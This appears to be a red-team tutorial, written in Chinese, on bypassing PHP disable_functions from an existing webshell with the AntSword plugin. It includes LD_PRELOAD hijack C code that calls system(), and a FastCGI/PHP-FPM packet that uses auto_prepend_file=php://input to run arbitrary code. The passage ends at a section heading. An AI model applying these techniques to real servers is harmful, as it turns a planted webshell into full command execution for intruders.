# 通过Antsword看绕过disable_functions
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
作者: Imanfeng@360RedTeam
## 0x00 前言
在实际渗透一些php站的时候，时常会遇到有了webshell，却无法执行命令的情况，大多数是因为使用 disablefunctions
禁用了命令执行的相关函数。判断某种绕过方法的关联依赖函数是否也被禁用了或者依赖环境是否可用是较麻烦的，本文则主要讲Antsword插件实现的disablefunctions方法及整理的其他公开可利用方式。
## 0x01 Antsword
自18年8月的 v2.0.0-beta 版本开始，引入了加载器的概念
用户及开发者无需安装额外的环境，只需要下载对应平台的加载器可直接运行当前最新的开发版和发行版
操作系统 | 下载地址 | MD5  
---|---|---  
OSX | [AntSword-Loader-v4.0.3-darwin-x64.dmg](https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-darwin-x64.dmg) |
ca218a249b049121ba4e568a272ee389  
Linux 32位 | [AntSword-Loader-v4.0.3-linux-ia32.zip](https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-linux-ia32.zip) |
5e0bebe1c88686e144fae9ddfa82aceb  
Linux 64位 | [AntSword-Loader-v4.0.3-linux-x64.zip](https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-linux-x64.zip) |
ee61d2e3f5ef018add0f147dd60db006  
Linux armv7l | [AntSword-Loader-v4.0.3-linux-armv7l.zip](https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-linux-armv7l.zip) |
bff6660f32ad308c1bb146f507825978  
Linux arm64 | [AntSword-Loader-v4.0.3-linux-arm64.zip](https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-linux-arm64.zip) |
045ecb8cca4f50498530837522c964dc  
Windows 32位 | [AntSword-Loader-v4.0.3-win32-ia32.zip](https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-win32-ia32.zip) |
3e4bff86c5724f77852611c3435aa80b  
Windows 64位 | [AntSword-Loader-v4.0.3-win32-x64.zip](https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-win32-x64.zip) |
85b80052224061e42f685021f28d1975  
同版本开始引入了插件的概念，用户可从远程PlugStore安装现成插件或结合自身需求编写插件来扩展蚁剑的功能，如端口扫描、权限提升等一些列后渗透操作
## 0x02 绕过disable_functions插件
Medicean在4月份基于Antsword插件规则编写了[asbypassphpdisablefunctions](https://github.com/Medicean/as_bypass_php_disable_functions)插件，便于绕过disable_functions的命令执行限制
###  1.LD_PRELOAD
####  利用原理
LD_PRELOAD 是Linux的环境变量，它允许你定义在程序运行前优先加载的动态链接库
在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件，so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的
mail() 、 error_log()、ImageMagick()
是常用于劫持的触发函数，原因是需要在运行的时候能够启动子进程，这样才能重新加载我们所设置的环境变量，从而劫持子进程所调用的库函数
  * mail函数在运行时，会启动子进程来调用系统的sendmail
  * error_log函数当第二个参数为1时，同样会启动子进程来调用系统的sendmail
  * ImageMagick函数调用时，也会调用外部程序去处理指定格式文件
以mail()函数为例，查看sendmail调用的函数
可选择不需传递参数的get型函数进行劫持，通过 man 命令查看getegid()函数的实现
重写 getegid() 函数进行编译
    // testcc.c
    #include 
    #include 
    uid_t getegid(void){
      if (getenv("LD_PRELOAD") == NULL){//防止其他函数也被劫持
            return 0;
        }
        unsetenv("LD_PRELOAD");//用完即删
        system("whoami > testcc.txt");
        return 0;
    }
成功劫持getegid()函数执行命令
####  插件实现
在插件中，该原理脚本如下:
hack.so会调用php开启一个默认配置的PHPServer
并在web目录生成一个.antproxy.php，与新PHPServer建立Socket连接，转发流量到index.php一句话执行命令
成功使用此绕过插件的三个必要条件是：
  1. mail()函数和error_log()函数所调用的sendmail已安装
  2. 不限制 /usr/sbin/sendmail 的执行
  3. mail()函数和error_log()函数有一个未被禁用
那如果目标环境没有sendmail或者禁止调用sendmail的话，该插件方法就无法使用
扩展方法可利用__attribute__ ((__constructor__))，其为GCC的C
语言扩展修饰符。当它出现在共享对象中时，一旦共享对象被系统加载，立即将执行 __attribute__((constructor))
修饰的函数，实现对共享库的劫持
    // testss.c
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    __attribute__ ((__constructor__)) void angel (void){
        unsetenv("LD_PRELOAD");
        const char* cmd = getenv("CMD");
        system(cmd);
    }
使用php尝试执行开启新PHPServer的命令
执行成功，可直接将流量转发到6666的PHPServer继续命令执行
###  2.Fastcgi/PHP-FPM
####  利用原理
Fastcgi 是一种通讯协议，用于Web服务器与后端语言的数据交换；PHP-FPM 则是php环境中对Fastcgi协议的管理程序实现
Nginx为fastcgi 提供了 fastcgi_param 来主要处理映射关系，将 Nginx 中的变量翻译成 PHP 能够理解的变量
例如用户访问http://127.0.0.1/hackme.php?test=1，假设web目录为/var/www/html，那么请求会被解析成如下键值对：
    {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'GET',
        'SCRIPT_FILENAME': '/var/www/html/hackme.php',
        'SCRIPT_NAME': '/hackme.php',
        'QUERY_STRING': '?test=1',
        'REQUEST_URI': '/hackme.php?test=1',
        'DOCUMENT_ROOT': '/var/www/html',
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '6666',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1'
    }
其中SCRIPT_FILENAME 用于指定执行的文件，但php-fpm的默认配置中有一个选项：security.limit_extensions
限制了fpm可执行的后缀文件
我们可利用两个php环境变量字段来构造fastcgi包让fpm执行指定的文件： PHP_VALUE及PHP_ADMIN_VALUE
PHP_VALUE 可动态修改模式为PHP_INI_USER和PHP_INI_ALL的配置项，但不能设置on/off等布尔值
例如使用如下fastcgi指令，通过设置 auto_prepend_file 来实现运行第一个php代码前加载指定的HACK.php
    fastcgi_param PHP_VALUE "auto_prepend_file=/var/html/www/7488/HACK.php";
PHP_ADMIN_VALUE可以设置php.ini的属性值任意配置项且不会被.htaccess和ini_set()函数所覆盖
但无法覆盖disablefunctions，原因是因为在php运行时，已经按照disablefunctions将禁用函数对应的地址从函数hash列表中剔除
构造攻击协议包如下：
    {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'GET',
        'SCRIPT_FILENAME': '/var/www/html/hackme.php',
        'SCRIPT_NAME': '/hackme.php',
        'QUERY_STRING': '?test=1',
        'REQUEST_URI': '/hackme.php?test=1',
        'DOCUMENT_ROOT': '/var/www/html',
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '6666',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1'
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }
设置auto_prepend_file = php://input以及allow_url_include =
On，实现在执行php文件执行前进行远程文件包含POST内容，从而任意代码执行
####  插件实现